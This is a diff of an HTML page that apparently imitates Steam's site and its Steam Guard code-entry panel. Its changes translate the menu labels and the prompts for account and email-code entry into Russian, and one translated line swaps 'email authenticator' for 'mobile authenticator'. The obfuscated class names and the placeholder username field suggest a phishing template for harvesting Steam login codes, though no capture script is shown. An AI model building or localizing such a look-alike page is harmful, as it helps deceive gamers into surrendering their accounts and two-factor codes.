@@ -77,7 +77,7 @@
                         <a class="submenuitem" href="https://store.steampowered.com/news/?snr=1_60_4__global-responsive-menu">News</a>
                         <a class="submenuitem" href="https://store.steampowered.com/stats/?snr=1_60_4__global-responsive-menu">Stats</a>
                     </div>
-                    <a class="menuitem supernav" href="https://steamcommunity.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_Community">Community</a>
+                    <a class="menuitem supernav" href="https://steamcommunity.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_Community">СООБЩЕСТВО</a>
                     <div class="submenu_Community" style="display: none;" data-submenuid="Community">
                         <a class="submenuitem" href="https://steamcommunity.com/">Home</a>
                         <a class="submenuitem" href="https://steamcommunity.com/discussions/">Discussions</a>
@@ -85,8 +85,8 @@
                         <a class="submenuitem" href="https://steamcommunity.com/market/">Market</a>
                         <a class="submenuitem" href="https://steamcommunity.com/?subsection=broadcasts">Broadcasts</a>
                     </div>
-                    <a class="menuitem " href="https://store.steampowered.com/about/?snr=1_60_4__global-responsive-menu">About</a>
-                    <a class="menuitem " href="https://help.steampowered.com/en/">Support</a>
+                    <a class="menuitem " href="https://store.steampowered.com/about/?snr=1_60_4__global-responsive-menu">ИНФОРМАЦИЯ</a>
+                    <a class="menuitem " href="https://help.steampowered.com/en/">ПОДДЕРЖКА</a>
                     
                     <div class="minor_menu_items">
                         <div class="menuitem change_language_action">Change language</div>
@@ -234,11 +234,11 @@
   style="width: 153px; height: 65px; position: relative; left: -30px;top: -30px;"
 >
 <div class="_1hKgiFuFaVR_Sq1Gj_gCnd" style="position: absolute; top: 97px; left: 280px; font-family: Arial, sans-serif; font-size: 18px; color: #AFAFAF; z-index: 10; font-weight: bold;">
-    Account: <span class="_31Vq4lzNWs4WikXVr9J4hz" style="color: #FFFFFF;" id="usernameDisplay">User</span>
+    Аккаунт: <span class="_31Vq4lzNWs4WikXVr9J4hz" style="color: #FFFFFF;" id="usernameDisplay">User</span>
 </div>
 
 <div class="_2o5mE8JpPFOyJ0HwX_y0y7" style="position: absolute; top: 130px; left: 150px; font-family: Arial, sans-serif; font-size: 15px; color: #838383d3; z-index: 10; font-weight: bold;">
-    You have an email authenticator protecting this account.
+    У вас настроен мобильный аутентификатор для защиты аккаунта.
 </div>
 
 </div>
@@ -257,7 +257,7 @@
 
 
 <div class="_3aMbj3PT-p1yxEt98UM56K" style="position: absolute; top: 290px; left: 45%; transform: translateX(-50%); font-family: Arial, sans-serif; font-size: 16px; color: #FFFFFF; text-align: center;">
-    Enter the code from your email address at: <br>
+    Введите код со своего адреса электронной почты по адресу: <br>
     <span class="_3BKzb-aGSLOjp5jsQ8wwXK" style="color: #1990FF;">gmail.com</span>
 </div>
 <svg width="55" height="75" viewBox="0 0 58 56" style="position: absolute; top: 270px; right: 105px;">
